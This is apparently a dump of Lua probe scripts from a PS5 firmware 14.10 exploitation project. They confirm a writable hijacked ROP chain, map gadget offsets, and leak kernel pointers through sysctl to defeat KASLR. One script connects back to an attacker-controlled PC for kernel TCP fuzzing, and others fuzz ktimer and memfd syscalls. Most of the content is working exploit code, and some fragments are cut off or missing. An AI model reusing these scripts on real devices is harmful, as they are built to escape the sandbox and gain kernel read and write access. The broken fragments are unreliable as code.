                    -- heap pointers (0x3_1xxxxxxx)

                    -- type desc pointers (0x1_xxxxxxxx)
                    if qh == 1 then vtable_ptrs = vtable_ptrs + 1 end
                end
            end
        end
        print(string.format("in first %d pages: kptrs=%d heap_ptrs=%d vtable_ptrs=%d",
            math.min(readable, 16), kptrs, heap_ptrs, vtable_ptrs))

        local orig = safe_rd(test_addr)
        local ok_hw = pcall(function() memory.write_dword(test_addr, 0x41414141) end)

            (after == 0x41414141) and "WRITE CONFIRMED" or "WRITE FAILED"))
        -- restore
        if orig then safe_wd(test_addr, orig) end
    else
        print("no heap boundary found in 300 pages")
    end

    -- Cleanup

else
```

```lua
    if ok then return val end

    return ok

    end
    local n = to_num(v)
    return string.format("0x%X", n), 0, n

    -- The pipe address itself
    local addr_str = pipe_str:match("address @ (0x[0-9a-fA-F]+)")
    print("pipe address: " .. (addr_str or "nil"))
    print("could not parse ropchain address")
    print("raw (first 100): " .. pipe_str:sub(1, 100))
    return
end

print("ropchain: " .. rop_addr_str)
print("fn_addr: " .. fn_addr_str)
print("ret_addr: " .. ret_addr_str)

local rop_base = uint64(rop_addr_str)
local fn_addr_ptr = uint64(fn_addr_str)
local ret_addr_ptr = uint64(ret_addr_str)

--------------------------------------------------------------------
-- STEP 2: Allocate GPU mmap
--------------------------------------------------------------------
print("")
print("--- STEP 2: GPU MMAP ---")

local gpu_size = 512 * 0x4000 -- 512 pages = 8MB for max reach
local gpu_addr
pcall(function()
    gpu_addr = sc_mmap(uint64(0), uint64(gpu_size), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
if not gpu_addr then print("GPU mmap FAILED"); return end
print("GPU at: " .. qw_hex(gpu_addr))

--------------------------------------------------------------------
-- STEP 3: Check if ropchain is in the readable zone
--------------------------------------------------------------------
print("")
print("--- STEP 3: ROPCHAIN REACHABILITY ---")

-- Check distance
local _, gpu_h, gpu_l = qw_hex(gpu_addr)
local _, rop_h, rop_l = qw_hex(rop_base)

if gpu_h == rop_h then
    if rop_l < gpu_l then
        local dist = gpu_l - rop_l
        local pages = math.floor(dist / 0x4000)
        print(string.format("ropchain is %d pages (%d KB) before GPU", pages, dist / 1024))
    else
        print("ropchain is AFTER GPU — not in backward scan zone")
    end
elseif rop_h < gpu_h then
    print("ropchain in lower VA range than GPU")
else
    print("ropchain in higher VA range than GPU")
end

-- Direct read test
local test_q = safe_rq(rop_base)
if test_q then
    print("ropchain READ: " .. qw_hex(test_q) .. " SUCCESS")
else
    print("ropchain READ: FAILED (not accessible)")
    pcall(function() sc_munmap(gpu_addr, uint64(gpu_size)) end)
    return
end

-- Verify it matches expected gadget pattern
-- First qword should be eboot+0x42 (ret gadget)
local _, th, tl = qw_hex(test_q)
local expected_lo = eb_tl + 0x42
local expected_hi = eb_th
if expected_lo >= 0x100000000 then
    expected_hi = expected_hi + 1
    expected_lo = expected_lo - 0x100000000
end
if th == expected_hi and tl == expected_lo then
    print("first gadget matches eboot+0x42 (ret) — CONFIRMED ropchain")
else
    print(string.format("mismatch: got 0x%X%08X expected 0x%X%08X",
        th, tl, expected_hi, expected_lo))
end

--------------------------------------------------------------------
-- STEP 4: Write test — write and immediately restore
--------------------------------------------------------------------
print("")
print("--- STEP 4: WRITE TEST ---")

-- Read original value
local orig = safe_rq(rop_base)
print("original: " .. qw_hex(orig))

-- Write test pattern
local test_pattern = uint64("0x4141414142424242")
safe_wq(rop_base, test_pattern)
local after_write = safe_rq(rop_base)
print("after write: " .. qw_hex(after_write))

-- Restore
safe_wq(rop_base, orig)
local after_restore = safe_rq(rop_base)
print("after restore: " .. qw_hex(after_restore))

local _, aw_h, aw_l = qw_hex(after_write)
local writable = (aw_h == 0x41414141 and aw_l == 0x42424242)

if writable then
    print("")
    print("*** ROPCHAIN IS FULLY WRITABLE ***")
else
    print("write failed — ropchain may be read-only mapped")
    pcall(function() sc_munmap(gpu_addr, uint64(gpu_size)) end)
    return
end

--------------------------------------------------------------------
-- STEP 5: Verify fn_addr is also writable
--------------------------------------------------------------------
print("")
print("--- STEP 5: FN_ADDR WRITE TEST ---")

local fn_orig = safe_rq(fn_addr_ptr)
print("fn_addr original: " .. qw_hex(fn_orig))

safe_wq(fn_addr_ptr, test_pattern)
local fn_after = safe_rq(fn_addr_ptr)
print("fn_addr after write: " .. qw_hex(fn_after))

-- Restore
safe_wq(fn_addr_ptr, fn_orig)
print("fn_addr restored: " .. qw_hex(safe_rq(fn_addr_ptr)))

local _, fah, fal = qw_hex(fn_after)
local fn_writable = (fah == 0x41414141 and fal == 0x42424242)
print("fn_addr writable: " .. (fn_writable and "YES" or "NO"))

--------------------------------------------------------------------
-- STEP 6: Map the ropchain's argument slots
-- The chain loads args from fixed memory locations:
--   fn_addr+0x70 = arg6 slot
--   fn_addr+0x80 = arg5 slot
--   etc.
-- Find where each syscall argument gets loaded from
--------------------------------------------------------------------
print("")
print("--- STEP 6: ARGUMENT SLOT MAP ---")

-- The chain pattern from 41v/41y:
-- Each arg is loaded via: pop_rax → arg_slot_addr → mov rax,[rax] → pop rdi → dest → mov [rdi],rax
-- The arg slots are the addresses like 0x311118040, 0x311118050, etc.
-- Let's extract them from the chain

-- Parse the chain: every "pop rax;ret" is followed by a data qword (the slot address)
-- then "mov rax,[rax];ret"
local pop_rax_gadget_lo = eb_tl + 0x992
local pop_rax_gadget_hi = eb_th
if pop_rax_gadget_lo >= 0x100000000 then
    pop_rax_gadget_hi = pop_rax_gadget_hi + 1
    pop_rax_gadget_lo = pop_rax_gadget_lo - 0x100000000
end

local arg_slots = {}
for i = 0, 0x2E8, 8 do
    local q = safe_rq(rop_base + i)
    if q then
        local _, qh, ql = qw_hex(q)
        if qh == pop_rax_gadget_hi and ql == pop_rax_gadget_lo then
            -- Next qword is the data operand
            local data_q = safe_rq(rop_base + i + 8)
            if data_q then
                local dh = qw_hex(data_q)
                arg_slots[#arg_slots + 1] = {
                    chain_off = i,
                    slot_addr = dh,
                    slot = data_q
                }
            end
        end
    end
end

print("argument slots found: " .. #arg_slots)
for j, s in ipairs(arg_slots) do
    -- Read current value in the slot
    local val = safe_rq(s.slot)
    local val_hex = val and qw_hex(val) or "unreadable"
    print(string.format("  chain+0x%03X -> slot %s = %s", s.chain_off, s.slot_addr, val_hex))
end
print("")

-- Identify which slot is which argument
-- Based on the gadget after the data load:
-- pop rdi → first arg (rdi)
-- pop rsi → second arg (rsi)
-- pop rdx → third arg (rdx)
-- pop rcx → fourth arg (rcx)
-- pop r8  → fifth arg (r8)

print("slot → register mapping:")
for i = 0, 0x2E8, 8 do
    local q = safe_rq(rop_base + i)
    if q then
        local _, qh, ql = qw_hex(q)
        local off_from_eboot = ql - eb_tl
        if qh == eb_th then
            -- Check known gadget offsets
            local name = nil
            if off_from_eboot == 0xC9DFE then name = "pop_rdi"
            elseif off_from_eboot == 0xD77D then name = "pop_rsi"
            elseif off_from_eboot == 0x3502D7 or off_from_eboot == 0x4202D7 then name = "pop_rdx"
            elseif off_from_eboot == 0xE64 then name = "pop_rcx"
            elseif off_from_eboot == 0x991 then name = "pop_r8"
            elseif off_from_eboot == 0x9A2 then name = "pop_rsp"
            elseif off_from_eboot == 0x92C67 then name = "mov_[rdi],rax"
            elseif off_from_eboot == 0x1EEBB then name = "mov_rax,[rax]"
            end
            if name then
                local next_val = safe_rq(rop_base + i + 8)
                print(string.format("  chain+0x%03X: %-18s (next: %s)",
                    i, name, next_val and qw_hex(next_val) or "?"))
            end
        end
    end
end

--------------------------------------------------------------------
-- STEP 7: Prove we can still call syscalls after read/restore
--------------------------------------------------------------------
print("")
print("--- STEP 7: SANITY CHECK ---")
local pid = nil
pcall(function() pid = sc_getpid() end)
print("getpid after all r/w tests: " .. (pid and to_num(pid) or "FAILED"))

-- Cleanup
pcall(function() sc_munmap(gpu_addr, uint64(gpu_size)) end)

print("")
print("=== EXPLOITATION STATUS ===")
print("")
if writable and fn_writable then
    print("*** FULL ROPCHAIN HIJACK CONFIRMED ***")
    print("")
    print("Capabilities:")
    print("  [x] Read ropchain from heap primitive")
    print("  [x] Write ropchain from heap primitive")
    print("  [x] Write fn_addr (function call target)")
    print("  [x] Write argument slots (rdi, rsi, rdx, rcx, r8)")
    print("  [x] Syscalls still work after read/write/restore")
    print("")
    print("Next: overwrite arg slot values before a syscall to control")
    print("what the kernel receives — this gives arbitrary kernel R/W")
    print("via sysctl(kern.proc.pid) or similar data-returning syscalls")
end

print("")
print("=== PROBE 41z COMPLETE ===")
```

## probes/phase8_live_network/40_tcp_connectback.lua

```lua
-- 14.10 Probe 40: TCP connect-back to attacker machine
-- Connects to the PC running tools/tcp_fuzz_server.py and holds the
-- connection open while the PC replies with malformed TCP segments.
-- The kernel's tcp_input()/tcp_dooptions() parses attacker-controlled
-- bytes in kernel context — outside the syscall sandbox.
--
-- >>> EDIT PC_IP to the machine running tcp_fuzz_server.py <<<

local PC_IP = {10, 0, 0, 50}   -- <-- CHANGE ME
local PC_PORT = 31337

print("=== 40: TCP CONNECT-BACK ===")
print("fw: " .. tostring(FW_VERSION))
print("pid: " .. syscall.getpid():tonumber())
print("target: " .. table.concat(PC_IP, ".") .. ":" .. PC_PORT)

syscall.resolve({
    sc_socket = 97,
    sc_connect = 98,
    sc_close = 6,
    sc_sendmsg = 28,
    sc_recvmsg = 27,
    sc_poll = 209,
    sc_getsockopt = 118,
})

local MSG_DONTWAIT = 0x80

local sa = memory.alloc(16)
for i = 0, 15 do memory.write_byte(sa + i, 0) end
memory.write_byte(sa + 0, 16)
memory.write_byte(sa + 1, 2)
memory.write_byte(sa + 2, math.floor(PC_PORT / 256))
memory.write_byte(sa + 3, PC_PORT % 256)
for i = 1, 4 do memory.write_byte(sa + 3 + i, PC_IP[i]) end

local ok_s, rv_s = pcall(function() return syscall.sc_socket(2, 1, 6) end)
local fd = ok_s and rv_s:tonumber() or -1
print("socket: fd=" .. fd)
if fd < 0 then print("=== 40 DONE (no socket) ===") return end

print("connecting (may block briefly)...")
local ok_c, rv_c = pcall(function() return syscall.sc_connect(fd, sa, 16) end)
local crv = ok_c and rv_c:tonumber() or -999
print("connect: rv=" .. crv)
if crv ~= 0 then
    print("connect failed — is tcp_fuzz_server.py running and PC_IP right?")
    print("=== 40 DONE (no connect) ===")
    return
end
print("CONNECTED — entering receive loop")

-- Announce ourselves so the fuzz server knows the 4-tuple is live
local hello = memory.alloc(4)
memory.write_byte(hello, 0x50)  -- "PS5!"
memory.write_byte(hello + 1, 0x53)
memory.write_byte(hello + 2, 0x35)
memory.write_byte(hello + 3, 0x21)
local iov = memory.alloc(16)
memory.write_qword(iov, hello)
memory.write_qword(iov + 8, 4)
local mh = memory.alloc(64)
for i = 0, 63, 8 do memory.write_qword(mh + i, 0) end
memory.write_qword(mh + 16, iov)
memory.write_qword(mh + 24, 1)
pcall(function() return syscall.sc_sendmsg(fd, mh, MSG_DONTWAIT) end)

-- Receive loop: ~60s. Report everything; SO_ERROR checked each pass.
local rbuf = memory.alloc(2048)
local riov = memory.alloc(16)
local rmh = memory.alloc(64)
local pollfd = memory.alloc(8)
local errbuf = memory.alloc(4)
local errlen = memory.alloc(4)

for iter = 1, 600 do
    memory.write_dword(pollfd, fd)
    memory.write_word(pollfd + 4, 0x0001)  -- POLLIN
    memory.write_word(pollfd + 6, 0)
    local ok_p, rv_p = pcall(function() return syscall.sc_poll(pollfd, 1, 100) end)
    local rev = memory.read_word(pollfd + 6):tonumber()

    if rev > 0 then
        memory.write_qword(riov, rbuf)
        memory.write_qword(riov + 8, 2048)
        for i = 0, 63, 8 do memory.write_qword(rmh + i, 0) end
        memory.write_qword(rmh + 16, riov)
        memory.write_qword(rmh + 24, 1)
        local ok_r, rv_r = pcall(function() return syscall.sc_recvmsg(fd, rmh, MSG_DONTWAIT) end)
        local n = ok_r and rv_r:tonumber() or -999
        if n == 0 then
            print("iter " .. iter .. ": EOF (peer closed)")
            break
        elseif n > 0 then
            local hex = ""
            for i = 0, math.min(n - 1, 31) do
                hex = hex .. string.format("%02x", memory.read_byte(rbuf + i):tonumber())
            end
            print("iter " .. iter .. ": recv=" .. n .. " flags=0x" ..
                  string.format("%x", memory.read_dword(rmh + 32):tonumber()) ..
                  " data=" .. hex)
        end
        -- msg_flags check: MSG_OOB (0x1) would mean urgent data arrived
    end

    memory.write_dword(errlen, 4)
    pcall(function() syscall.sc_getsockopt(fd, 0xFFFF, 0x1007, errbuf, errlen) end) -- SO_ERROR
    local serr = memory.read_dword(errbuf):tonumber()
    if serr ~= 0 then
        print("iter " .. iter .. ": SO_ERROR=" .. serr)
        break
    end
end

pcall(function() syscall.sc_close(fd) end)
print("NOTE: a console hang/reboot during the loop = malformed TCP hit a")
print("kernel path. Check the PC-side log for which variant was in flight.")
print("=== 40 DONE ===")
```

## probes/phase8_live_network/42a_kernel_rw.lua

```lua
-- CRASH_CLASS: RISKY (ropchain manipulation, kernel info leak attempt)
-- PROBE 42a: kernel R/W via ropchain hijack
--
-- Strategy:
--   Phase 1: Try sysctl (syscall 202) normally — might be allowed
--   Phase 2: If blocked, use ropchain hijack to call sysctl's underlying
--            function directly, bypassing sandbox checks
--   Phase 3: Parse output for kernel pointers (KASLR defeat)
--
-- sysctl signature: __sysctl(int *name, u_int namelen, void *old,
--                            size_t *oldlenp, void *new, size_t newlen)
-- MIBs to try:
--   kern.version     = {1, 4}
--   kern.osrelease   = {1, 2}
--   kern.proc.pid    = {1, 14, 1, <pid>}  (struct kinfo_proc, has kptrs)
--   hw.machine       = {6, 1}
--   kern.proc.vmmap  = {1, 14, 35, <pid>} (VM map entries, has kptrs)

print("=== PROBE 42a: KERNEL R/W ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function qw_hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%X%08X", v.h, v.l), v.h, v.l
    end
    local n = to_num(v)
    return string.format("0x%X", n), 0, n
end

local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(588)
local sc_getpid = make_syscall(20)
local sc_sysctl = make_syscall(202)

--------------------------------------------------------------------
-- STEP 0: Get PID
--------------------------------------------------------------------
local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

--------------------------------------------------------------------
-- PHASE 1: Try sysctl normally
--------------------------------------------------------------------
print("")
print("=== PHASE 1: NORMAL SYSCTL ===")

local function try_sysctl(label, mib_values, out_size)
    out_size = out_size or 0x1000
    local mib = memory.alloc(#mib_values * 4)
    for i, v in ipairs(mib_values) do
        safe_wd(mib + (i-1) * 4, v)
    end

    local outbuf = memory.alloc(out_size)
    -- zero the output
    for off = 0, math.min(out_size - 1, 0xFF), 4 do
        safe_wd(outbuf + off, 0)
    end

    local oldlenp = memory.alloc(8)
    safe_wd(oldlenp, out_size)
    safe_wd(oldlenp + 4, 0)

    local ok, ret = pcall(function()
        return sc_sysctl(
            uint64(mib),           -- name
            uint64(#mib_values),   -- namelen
            uint64(outbuf),        -- old (output buffer)
            uint64(oldlenp),       -- oldlenp
            uint64(0),             -- new (NULL = read only)
            uint64(0)              -- newlen
        )
    end)

    local retval = ok and to_num(ret) or -999
    local actual_len = safe_rd(oldlenp)

    print(string.format("  %s: ret=%d len=%s", label, retval,
        actual_len and tostring(actual_len) or "?"))

    if retval == 0 and actual_len and actual_len > 0 then
        -- dump first bytes as text (for version strings)
        local text = ""
        local raw = {}
        for off = 0, math.min(actual_len - 1, 127) do
            local b = safe_rd(outbuf + off)
            if b then
                b = b % 256  -- just low byte
                if b >= 0x20 and b < 0x7F then
                    text = text .. string.char(b)
                elseif b == 0 then
                    break
                else
                    text = text .. "."
                end
            end
        end
        if #text > 0 then
            print("    text: " .. text)
        end

        -- dump as qwords looking for kernel pointers
        local kptrs = {}
        for off = 0, math.min(actual_len - 1, 0x3FF), 8 do
            local q = safe_rq(outbuf + off)
            if q then
                local h, l = 0, 0
                if type(q) == "table" and q.h then h = q.h; l = q.l
                else l = to_num(q) end
                -- kernel pointers on FreeBSD/PS5: 0xFFFFxxxx_xxxxxxxx
                if h >= 0xFFFF8000 then
                    kptrs[#kptrs + 1] = {off = off, h = h, l = l}
                end
            end
        end

        if #kptrs > 0 then
            print("    *** KERNEL POINTERS FOUND ***")
            for _, kp in ipairs(kptrs) do
                print(string.format("      +0x%03X: 0x%08X%08X", kp.off, kp.h, kp.l))
            end
        else
            -- dump first 8 qwords raw
            print("    raw qwords:")
            for off = 0, math.min(actual_len - 1, 0x3F), 8 do
                local q = safe_rq(outbuf + off)
                if q then
                    local h, l = 0, 0
                    if type(q) == "table" and q.h then h = q.h; l = q.l end
                    if h ~= 0 or l ~= 0 then
                        print(string.format("      +%02X: %08X_%08X", off, h, l))
                    end
                end
            end
        end

        return true, kptrs, outbuf, actual_len
    end

    return false, {}, nil, 0
end

-- Try various MIBs
try_sysctl("kern.version",   {1, 4})
try_sysctl("kern.osrelease", {1, 2})
try_sysctl("kern.ostype",    {1, 1})
try_sysctl("hw.machine",     {6, 1})
try_sysctl("hw.pagesize",    {6, 7}, 8)
try_sysctl("kern.maxproc",   {1, 6}, 8)

-- The big one: kinfo_proc has kernel pointers
print("")
print("--- KINFO_PROC (kern.proc.pid) ---")
local got_kinfo, kptrs, kinfo_buf, kinfo_len =
    try_sysctl("kern.proc.pid", {1, 14, 1, pid}, 0x1000)

if got_kinfo and kinfo_len > 0x100 then
    -- kinfo_proc struct has process addresses at known offsets
    -- On FreeBSD, ki_paddr (process struct addr) is at offset ~0x00
    -- ki_addr (user struct addr) at ~0x08
    -- ki_vmspace at ~0x298
    print("  extended kinfo dump (every 8th qword):")
    for off = 0, math.min(kinfo_len - 1, 0x3FF), 0x40 do
        local q = safe_rq(kinfo_buf + off)
        if q then
            local h, l = 0, 0
            if type(q) == "table" and q.h then h = q.h; l = q.l end
            local tag = ""
            if h >= 0xFFFF8000 then tag = " KPTR!" end
            if h ~= 0 or l ~= 0 then
                print(string.format("    +%03X: %08X_%08X%s", off, h, l, tag))
            end
        end
    end
end

-- Try kern.proc.vmmap — returns VM map entries with kernel addresses
print("")
print("--- VMMAP (kern.proc.vmmap) ---")
try_sysctl("kern.proc.vmmap", {1, 14, 35, pid}, 0x4000)

-- Try kern.proc.pathname — sometimes leaks vnode pointers
print("")
print("--- PROC PATHNAME ---")
try_sysctl("kern.proc.pathname", {1, 14, 12, pid}, 0x400)

print("")

--------------------------------------------------------------------
-- PHASE 2: Additional kernel info syscalls
--------------------------------------------------------------------
print("=== PHASE 2: OTHER KERNEL SYSCALLS ===")

-- kenv (390) — read kernel environment variables
print("--- kenv ---")
local sc_kenv = make_syscall(390)
local kenv_buf = memory.alloc(0x1000)
for off = 0, 0xFF, 4 do safe_wd(kenv_buf + off, 0) end
local ok_kenv, kenv_ret = pcall(function()
    -- kenv(KENV_DUMP=0, NULL, kenv_buf, 4096)

end)
local kenv_rv = ok_kenv and to_num(kenv_ret) or -999

if kenv_rv > 0 and kenv_rv < 0x1000 then

            b = b % 256

                text = text .. string.char(b)
            elseif b == 0x0A or b == 0 then
                if #text > 0 then
                    print("    " .. text)
                    text = ""
                end
            else
                text = text .. "."
            end
        end
    end
end

-- mib lookup (syscall 202 with name2oid)
-- sysctl name2oid: name={0, 3}, rest is string
print("")
print("--- sysctl name2oid ---")
local name2oid_name = memory.alloc(32)
-- write "kern.smp.cpus" as bytes
local s = "kern.smp.cpus"
for i = 1, #s do

end
memory.write_byte(name2oid_name + #s, 0)

local oid_mib = memory.alloc(8)
safe_wd(oid_mib, 0)  -- CTL_SYSCTL = 0
safe_wd(oid_mib + 4, 3)  -- CTL_SYSCTL_NAME2OID = 3

safe_wd(oid_lenp + 4, 0)

local ok_n2o, ret_n2o = pcall(function()
    return sc_sysctl(uint64(oid_mib), uint64(2),
        uint64(oid_out), uint64(oid_lenp),
        uint64(name2oid_name), uint64(#s))
end)
local n2o_rv = ok_n2o and to_num(ret_n2o) or -999
print(string.format("  name2oid('kern.smp.cpus'): ret=%d", n2o_rv))
if n2o_rv == 0 then
    local oid_len = safe_rd(oid_lenp)
    local oid_count = oid_len and math.floor(oid_len / 4) or 0
    local oid_str = "oid:"
    for i = 0, oid_count - 1 do
        local v = safe_rd(oid_out + i * 4)
        oid_str = oid_str .. " " .. (v and tostring(v) or "?")
    end
    print("    " .. oid_str)

    -- now read that oid's value
    local cpus_buf = memory.alloc(8)
    local cpus_lenp = memory.alloc(8)
    safe_wd(cpus_lenp, 4)
    local ok_cpus, ret_cpus = pcall(function()
        return sc_sysctl(uint64(oid_out), uint64(oid_count),
            uint64(cpus_buf), uint64(cpus_lenp), uint64(0), uint64(0))
    end)
    if ok_cpus and to_num(ret_cpus) == 0 then
        local cpus = safe_rd(cpus_buf)
        print("    kern.smp.cpus = " .. (cpus or "?"))
    end
end

print("")

--------------------------------------------------------------------
-- PHASE 3: GPU mmap + ropchain — verify still reachable
-- (for next probe that will do direct kernel function call)
--------------------------------------------------------------------
print("=== PHASE 3: ROPCHAIN STATUS ===")

local pipe_str = tostring(syscall.pipe)
local rop_addr_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")
local fn_addr_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")

if rop_addr_str then
    print("ropchain: " .. rop_addr_str)
    print("fn_addr: " .. fn_addr_str)

    -- allocate GPU mmap
    local gpu_size = 512 * 0x4000
    local gpu_addr
    pcall(function()
        gpu_addr = sc_mmap(uint64(0), uint64(gpu_size), uint64(0x33),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)

    if gpu_addr then
        local rop_base = uint64(rop_addr_str)
        local test_q = safe_rq(rop_base)
        if test_q then
            print("ropchain READABLE from heap primitive: " .. qw_hex(test_q))
            print("chain hijack READY for Phase 4 (direct kernel call)")
        else
            print("ropchain NOT reachable this run")
        end
        pcall(function() sc_munmap(gpu_addr, uint64(gpu_size)) end)
    else
        print("GPU mmap failed")
    end
else
    print("could not parse ropchain address")
end

print("")
print("=== PROBE 42a COMPLETE ===")
```

## probes/phase8_live_network/42a_ktimer_deep.lua

```lua
-- 14.10 Probe 42a: ktimer deep dive (new attack surface from probe 38)
-- ktimer_create WORKS (timerid 3 returned). POSIX timers are kernel
-- objects with alloc/arm/disarm/delete lifecycle and signal delivery.
-- Historically buggy in BSD: itimerspec validation, clock id handling,
-- timer id reuse, overrun counting. No threads needed for any of this.

print("=== 42a: KTIMER DEEP ===")
print("fw: " .. tostring(FW_VERSION))
print("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_ktimer_create = 235,
    sc_ktimer_settime = 236,
    sc_ktimer_gettime = 238,
    sc_ktimer_delete = 237,
    sc_ktimer_getoverrun = 239,
    sc_sigaction = 416,
})

local sevp = memory.alloc(64)
local tid = memory.alloc(8)
local its = memory.alloc(16)   -- itimerspec: 2x timespec = 4 qwords
local its2 = memory.alloc(16)

local function report(tag, fn)
    local ok, rv = pcall(fn)
    if not ok then
        print(tag .. ": PCALL ERR")
    elseif rv == nil then
        print(tag .. ": nil")
    else
        local okn, n = pcall(function() return rv:tonumber() end)
        print(tag .. ": rv=" .. (okn and tostring(n) or tostring(rv)))
    end
end

local function zero(b, n) for i = 0, n - 1, 8 do memory.write_qword(b + i, 0) end end

-- ---------------------------------------------------------------
-- PART 1: clock id sweep (0..15) — which clocks does the sandbox allow?
-- ---------------------------------------------------------------
print("")
print("--- PART 1: clock id sweep ---")
local clock_ok = {}
for clk = 0, 15 do
    zero(sevp, 64)                        -- sigev_notify = 0 (SIGEV_NONE)
    memory.write_qword(tid, 0xFFFFFFFFFFFFFFFF)
    local ok, rv = pcall(function()
        return syscall.sc_ktimer_create(clk, sevp, tid)
    end)
    local r = ok and rv:tonumber() or -999
    local id = memory.read_dword(tid):tonumber()
    print(string.format("clock %2d: rv=%d timerid=%d", clk, r, id))
    if r == 0 then
        table.insert(clock_ok, { clk = clk, id = id })
    end
end
print("usable clocks: " .. #clock_ok)

-- ---------------------------------------------------------------
-- PART 2: itimerspec validation games on the first working timer
-- ---------------------------------------------------------------
print("")
print("--- PART 2: itimerspec validation ---")
if #clock_ok == 0 then
    print("no working timer — skipping")
else
    local t = clock_ok[1].id

    -- normal arm: 1s one-shot
    zero(its, 16)
    memory.write_qword(its + 8, 1)        -- it_value.tv_sec = 1
    report("settime(1s oneshot)", function()
        return syscall.sc_ktimer_settime(t, 0, its, its2)
    end)
    report("gettime", function() return syscall.sc_ktimer_gettime(t, its2) end)
    print(string.format("  remaining: sec=%d nsec=%d",
        memory.read_qword(its2 + 8):tonumber(), memory.read_qword(its2):tonumber()))

    -- nsec > 1e9 (validation bug check)
    zero(its, 16)
    memory.write_qword(its + 8, 0)        -- sec = 0
    memory.write_qword(its, 0xFFFFFFFF)   -- nsec = 4G (invalid, >1e9)
    report("settime(nsec=4G)", function()
        return syscall.sc_ktimer_settime(t, 0, its, its2)
    end)

    -- negative nsec
    zero(its, 16)
    memory.write_qword(its, 0xFFFFFFFFFFFFFFFF)  -- nsec = -1
    memory.write_qword(its + 8, 1)
    report("settime(nsec=-1)", function()
        return syscall.sc_ktimer_settime(t, 0, its, its2)
    end)

    -- huge interval (wrap games)
    zero(its, 16)
    memory.write_qword(its + 8, 0x7FFFFFFFFFFFFFFF)  -- it_value sec = huge
    report("settime(sec=2^63-1)", function()
        return syscall.sc_ktimer_settime(t, 0, its, its2)
    end)

    -- disarm
    zero(its, 16)
    report("disarm", function() return syscall.sc_ktimer_settime(t, 0, its, its2) end)
end

-- ---------------------------------------------------------------
-- PART 3: timer id abuse
-- ---------------------------------------------------------------
print("")
print("--- PART 3: id abuse ---")
report("gettime(id=0)", function() return syscall.sc_ktimer_gettime(0, its2) end)
report("gettime(id=-1)", function() return syscall.sc_ktimer_gettime(-1, its2) end)
report("gettime(id=0x7fffffff)", function() return syscall.sc_ktimer_gettime(0x7FFFFFFF, its2) end)
report("delete(id=0)", function() return syscall.sc_ktimer_delete(0) end)
report("delete(id=-1)", function() return syscall.sc_ktimer_delete(-1) end)

-- delete a real timer twice (double-delete / id reuse)
if #clock_ok > 0 then
    local t = clock_ok[1].id
    report("delete(real) #1", function() return syscall.sc_ktimer_delete(t) end)
    report("delete(real) #2", function() return syscall.sc_ktimer_delete(t) end)
    -- create again: do we get the same id back?
    zero(sevp, 64)
    memory.write_qword(tid, 0xFFFFFFFF)
    report("create after delete", function() return syscall.sc_ktimer_create(0, sevp, tid) end)
    print("  new timerid: " .. memory.read_dword(tid):tonumber())
end

-- ---------------------------------------------------------------
-- PART 4: exhaustion — how many timers can we create?
-- ---------------------------------------------------------------
print("")
print("--- PART 4: create exhaustion (cap at 64) ---")
local made = 0
for i = 1, 64 do
    zero(sevp, 64)
    memory.write_qword(tid, 0xFFFFFFFF)
    local ok, rv = pcall(function() return syscall.sc_ktimer_create(0, sevp, tid) end)
    if not ok or rv:tonumber() ~= 0 then
        print("stopped at i=" .. i .. " rv=" .. (ok and rv:tonumber() or -999))
        break
    end
    made = made + 1
end
print("timers created: " .. made)

-- ---------------------------------------------------------------
-- PART 5: getoverrun
-- ---------------------------------------------------------------
print("")
print("--- PART 5: getoverrun ---")
report("getoverrun(id=0)", function() return syscall.sc_ktimer_getoverrun(0) end)
if #clock_ok > 1 then
    report("getoverrun(real)", function() return syscall.sc_ktimer_getoverrun(clock_ok[2].id) end)
end

print("=== 42a DONE ===")
```

## probes/phase8_live_network/42b_memfd_msync.lua

```lua
-- 14.10 Probe 42b: memfd + vectored I/O + msync isolation
-- Probe 38 died at minherit (phase 3) — msync never got tested.
-- Also memfd_create returned rv=1 (fd 1?) which is suspicious; check
-- whether it's a real kernel object usable with preadv/pwritev/ftruncate.

print("=== 42b: MEMFD + PREADV + MSYNC ===")
print("fw: " .. tostring(FW_VERSION))
print("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_memfd_create = 585,
    sc_pwritev = 290,
    sc_preadv = 289,
    sc_ftruncate = 480,
    sc_mmap = 477,
    sc_msync = 226,
    sc_close = 6,
    sc_write = 4,
    sc_read = 3,
})

local function report(tag, fn)
    local ok, rv = pcall(fn)
    if not ok then
        print(tag .. ": PCALL ERR")
    elseif rv == nil then
        print(tag .. ": nil")
    else
        local okn, n = pcall(function() return rv:tonumber() end)
        print(tag .. ": rv=" .. (okn and tostring(n) or tostring(rv)))
    end
end

-- ---------------------------------------------------------------
-- PART 1: memfd_create — is the returned fd real?
-- ---------------------------------------------------------------
print("")
print("--- PART 1: memfd ---")
local nm = memory.alloc(8)
memory.write_byte(nm, 0x6B)   -- "k"
memory.write_byte(nm + 1, 0)

local ok_m, rv_m = pcall(function() return syscall.sc_memfd_create(nm, 0) end)
local mfd = ok_m and rv_m:tonumber() or -999
print("memfd_create: fd=" .. mfd)

if mfd >= 0 and mfd > 2 then
    -- grow it
    report("ftruncate(mfd, 0x10000)", function() return syscall.sc_ftruncate(mfd, 0x10000) end)

    -- write via plain write
    local wbuf = memory.alloc(16)
    for i = 0, 7 do memory.write_byte(wbuf + i, 0x41 + i) end
    report("write(mfd)", function() return syscall.sc_write(mfd, wbuf, 8) end)

    -- pwritev at offset 0x8000
